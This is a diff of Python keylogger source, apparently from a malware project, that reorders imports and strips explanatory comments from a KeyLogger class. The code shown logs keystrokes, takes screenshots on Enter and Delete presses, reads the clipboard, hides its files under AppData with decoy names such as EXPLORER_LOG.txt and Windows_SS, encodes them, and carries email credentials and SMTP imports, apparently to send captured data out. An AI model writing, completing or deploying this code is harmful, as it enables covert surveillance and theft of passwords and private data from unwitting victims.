@@ -1,35 +1,20 @@
-# Parallel operations
 import threading
-
-# Logging keystrokes
-import pynput.keyboard as pk
-
-# Time and date functionality
-from datetime import datetime
 import time
-
-# Email Functionality
 import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-
-# For system related commands
 import socket
 import subprocess
 import os
 import sys
 import shutil
-
-# For Capturing Screenshots
 import win32clipboard
-from PIL import ImageGrab
-
-# For storing screenshots in a queue
-from collections import deque
-
-# For Encrypting files
+import pynput.keyboard as pk
 import base64
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from PIL import ImageGrab
+from collections import deque
 
 # User defined module for Fetching Computer Info
 from com_info import fetch_info
@@ -39,7 +24,7 @@ class KeyLogger:
 
     def __init__(self, interval, email, password):
 
-        self.log = 'KeyLogger started\n'
+        self.log = 'KeyLogger started...\n'
 
         self.interval = interval
         self.email = email
@@ -53,12 +38,12 @@ class KeyLogger:
         self.ss_enterKey_count = 0
         self.ss_deleteKey_count = 0
 
-        self._FILE_PATH = os.environ['appdata'] # Path where the required files and screenshots will be saved
+        self._FILE_PATH = os.environ['appdata']
 
         self._SS_INFO = ''
-        self._KEYS_INFO = 'EXPLORER_LOG.txt'  # Name of the file having keylogs
-        self._SYSTEM_INFO = 'READ_ME.txt'  # Name of the file having system info
-        self._SS_FOLDER_NAME = 'Windows_SS' # Name of the SS folder
+        self._KEYS_INFO = 'EXPLORER_LOG.txt' 
+        self._SYSTEM_INFO = 'READ_ME.txt'
+        self._SS_FOLDER_NAME = 'Windows_SS'
         self.PRINT_DEBUG_LOGS = False
 
         self.files_to_encrypt = [os.path.join(self._FILE_PATH, self._KEYS_INFO), os.path.join(self._FILE_PATH, self._SYSTEM_INFO)]
@@ -102,13 +87,11 @@ class KeyLogger:
             elif key == key.enter:
                 current_key = ' <'+str(key)+'> \n'
                 if self.ss_enterKey_count < 10:
-                    # Take ss when ENTER key is pressed
                     self.screenshot()
                     self.ss_enterKey_count += 1
             elif key == key.delete:
                 current_key = ' <' + str(key) + '> '
                 if self.ss_deleteKey_count < 5:
-                    # Take ss when DEL key is pressed
                     self.screenshot()
                     self.ss_deleteKey_count += 1
             else:
